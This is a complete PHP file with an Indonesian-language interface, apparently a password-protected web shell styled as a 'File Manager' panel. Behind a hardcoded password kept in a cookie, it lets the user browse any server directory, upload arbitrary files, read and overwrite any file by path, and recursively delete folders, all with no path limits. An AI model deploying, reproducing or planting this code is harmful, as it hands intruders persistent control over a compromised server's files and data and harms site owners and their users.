<?php
$pw='danz'; // ganti password
if(isset($_GET['logout'])){setcookie('p','',time()-3600,'/');$r=$_SERVER['REQUEST_URI'];$r=preg_replace('/([?&])logout=1(&)?/','$1',$r);$r=rtrim($r,'?&');header('Location:'.$r);exit;}
if(!isset($_COOKIE['p'])||$_COOKIE['p']!==$pw){if(isset($_POST['p'])&&$_POST['p']===$pw){setcookie('p',$pw,time()+3600,'/');header('Location:'.$_SERVER['REQUEST_URI']);exit;}die('<!DOCTYPE html><html><head><meta charset="utf-8"><title>Login</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0f172a;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh}form{background:#1e293b;padding:40px;border-radius:16px;box-shadow:0 20px 40px rgba(0,0,0,0.5);width:360px}label{color:#cbd5e1;display:block;margin-bottom:12px;font-size:18px;font-weight:500}input[type=password]{width:100%;background:#0f172a;border:1px solid #475569;color:#e2e8f0;padding:14px;border-radius:8px;margin-bottom:20px;font-size:16px}input[type=submit]{width:100%;background:#2563eb;color:#fff;border:none;padding:14px;border-radius:8px;font-weight:bold;cursor:pointer;font-size:16px}input[type=submit]:hover{background:#1d4ed8}</style></head><body><form method="post"><label><i class="fa-solid fa-key"></i> Password</label><input type="password" name="p"><input type="submit" value=" Login"></form></body></html>');}
$dir=isset($_GET['dir'])?$_GET['dir']:getcwd();$dir=str_replace('\\','/',$dir);$dirs=explode('/',$dir);
if(isset($_POST['create'])){$n=trim($_POST['new_name']);if($n!==''){$p=$dir.'/'.$n;if($_POST['type']=='folder'){if(!file_exists($p))mkdir($p);}else{if(!file_exists($p))file_put_contents($p,'');}}header('Location:?dir='.urlencode($dir));exit;}
if(isset($_POST['submit'])){move_uploaded_file($_FILES['upload']['tmp_name'],$dir.'/'.$_FILES['upload']['name']);echo '<script>alert("Upload berhasil")</script>';}
if(isset($_GET['delete'])){$t=$_GET['delete'];if(is_dir($t)){function rrm($d){$f=array_diff(scandir($d),['.','..']);foreach($f as $x){$p="$d/$x";is_dir($p)?rrm($p):unlink($p);}rmdir($d);}rrm($t);echo '<script>alert("Dihapus");window.location="?dir='.urlencode($dir).'"</script>';}else{if(unlink($t)){echo '<script>alert("Dihapus");window.location="?dir='.urlencode($dir).'"</script>';}}}
if(isset($_POST['edit'])){if(file_put_contents($_POST['object'],$_POST['edit'])!==false){echo '<script>alert("Berhasil diedit");window.location="?dir='.urlencode($dir).'"</script>';}else{echo '<script>alert("Gagal")</script>';}}
?><!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><title>Panel</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0b1120;font-family:system-ui,sans-serif;color:#e0e5ec;padding:24px;font-size:15px}
.d{max-width:1300px;margin:0 auto}
h1{color:#fff;font-weight:600;font-size:2rem;margin-bottom:24px}
.p{background:#131c31;border:1px solid #1e2d4a;border-radius:12px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,0.4);margin-bottom:20px}
.ph{font-weight:600;color:#60a5fa;margin-bottom:16px;font-size:1rem;text-transform:uppercase;letter-spacing:.5px}
.br{display:flex;flex-wrap:wrap;align-items:center;gap:4px;font-size:15px}
.br a{color:#94a3b8;padding:4px 8px;border-radius:6px;transition:.2s}
.br a:hover{background:#1e2d4a;color:#fff}
.tb{display:flex;gap:15px;flex-wrap:wrap;align-items:center}
.tb form{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.tb input[type=text],.tb select,.tb input[type=file]{background:#0b1120;border:1px solid #1e2d4a;color:#e0e5ec;padding:10px 12px;border-radius:8px;outline:none;font-size:15px}
.tb input:focus,.tb select:focus{border-color:#3b82f6;box-shadow:0 0 0 2px rgba(59,130,246,0.2)}
.tb button,.tb input[type=submit]{background:#2563eb;color:white;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer;font-size:15px;transition:.2s}
.tb button:hover,.tb input[type=submit]:hover{background:#1d4ed8;transform:translateY(-1px)}
table{width:100%;border-collapse:collapse;background:#0b1120;border-radius:8px;overflow:hidden}
th{background:#1e2d4a;color:#a5b4cc;padding:14px 16px;text-align:left;font-weight:600;font-size:13px;text-transform:uppercase;letter-spacing:.8px}
td{padding:13px 16px;border-bottom:1px solid #1e2d4a;font-size:15px}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(59,130,246,0.05)}
td a{color:#60a5fa;text-decoration:none;font-weight:500}
td a:hover{color:#93c5fd}
.btn{display:inline-block;padding:6px 12px;border-radius:6px;font-size:14px;font-weight:500;text-decoration:none;margin:2px;transition:.2s}
.bp{background:#2563eb;color:#fff}
.bp:hover{background:#1d4ed8}
.bd{background:#b91c1c;color:#fff}
.bd:hover{background:#dc2626}
.bn{background:#1e2d4a;color:#cbd5e1}
.bn:hover{background:#334155;color:#fff}
.ta{width:100%;min-height:420px;background:#0b1120;border:1px solid #1e2d4a;color:#e0e5ec;padding:18px;border-radius:10px;font-family:monospace;font-size:14px;resize:vertical;outline:none;transition:.2s}
.ta:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,0.15)}
.lo{text-align:center;margin-top:20px}
.lo a{color:#f87171;font-weight:500}
.lo a:hover{color:#fca5a5}
</style></head><body><div class="d">
<h1><i class="fa-solid fa-folder-tree"></i> File Manager</h1>
<div class="p">
<div class="ph"><i class="fa-solid fa-location-dot"></i> Direktori</div>
<div class="br">
<?php foreach($dirs as $i=>$v):?>
<?php if($v===''&&$i===0):?><a href="/"><i class="fa-solid fa-house"></i> /</a>
<?php else:?><a href="?dir=<?=urlencode(implode('/',array_slice($dirs,0,$i+1)))?>"><i class="fa-solid fa-folder"></i> <?=htmlspecialchars($v)?></a> /
<?php endif;?>
<?php endforeach;?>
</div>
</div>
<div class="p">
<div class="ph"><i class="fa-solid fa-screwdriver-wrench"></i> Tools</div>
<div class="tb">
<form method="post">
<input type="text" name="new_name" placeholder="Nama file/folder" required>
<select name="type">
<option value="file"> File</option>
<option value="folder"> Folder</option>
</select>
<button type="submit" name="create"><i class="fa-solid fa-plus"></i> Buat</button>
</form>
<form method="post" enctype="multipart/form-data">
<input type="file" name="upload" required>
<input type="submit" name="submit" value=" Upload">
</form>
</div>
</div>
<?php if(!isset($_GET['open'])&&!isset($_GET['ubah'])):?>
<div class="p">
<div class="ph"><i class="fa-solid fa-list"></i> Daftar File & Folder</div>
<table>
<tr><th>Nama</th><th>Ukuran</th><th>Aksi</th></tr>
<?php
$scan=scandir($dir);
foreach($scan as $item){if($item=='.'||$item=='..')continue;$path=$dir.'/'.$item;if(is_dir($path))echo '<tr><td><a href="?dir='.urlencode($path).'"><i class="fa-solid fa-folder"></i> '.htmlspecialchars($item).'</a></td><td>-</td><td></td></tr>';}
foreach($scan as $item){$path=$dir.'/'.$item;if(is_file($path)){$sz=filesize($path)/1024;$sz=($sz>=1024)?round($sz/1024,2).' MB':round($sz,2).' KB';echo '<tr><td><a href="?dir='.urlencode($dir).'&open='.urlencode($path).'"><i class="fa-solid fa-file"></i> '.htmlspecialchars($item).'</a></td><td>'.$sz.'</td><td><a href="?dir='.urlencode($dir).'&ubah='.urlencode($path).'" class="btn bp"><i class="fa-solid fa-pen-to-square"></i> Edit</a> <a href="?dir='.urlencode($dir).'&delete='.urlencode($path).'" class="btn bd" onclick="return confirm(\'Yakin?\')"><i class="fa-solid fa-trash"></i> Hapus</a></td></tr>';}}
?>
</table>
</div>
<?php endif;?>
<?php if(isset($_GET['open'])):?>
<div class="p">
<a href="?dir=<?=urlencode($dir)?>" class="btn bn"><i class="fa-solid fa-arrow-left"></i> Kembali</a>
<textarea class="ta" readonly><?=htmlspecialchars(file_get_contents($_GET['open']))?></textarea>
</div>
<?php endif;?>
<?php if(isset($_GET['ubah'])):?>
<div class="p">
<a href="?dir=<?=urlencode($dir)?>" class="btn bn" style="margin-bottom:14px"><i class="fa-solid fa-arrow-left"></i> Kembali</a>
<form method="post">
<input type="hidden" name="object" value="<?=htmlspecialchars($_GET['ubah'])?>">
<textarea class="ta" name="edit"><?=htmlspecialchars(file_get_contents($_GET['ubah']))?></textarea>
<button type="submit" style="margin-top:12px;padding:10px 20px;font-size:15px;background:#2563eb;color:white;border:none;border-radius:6px;cursor:pointer"><i class="fa-solid fa-floppy-disk"></i> Simpan</button>
</form>
</div>
<?php endif;?>
<div class="lo"><a href="?logout=1"><i class="fa-solid fa-right-from-bracket"></i> Logout</a></div>
</div></body></html>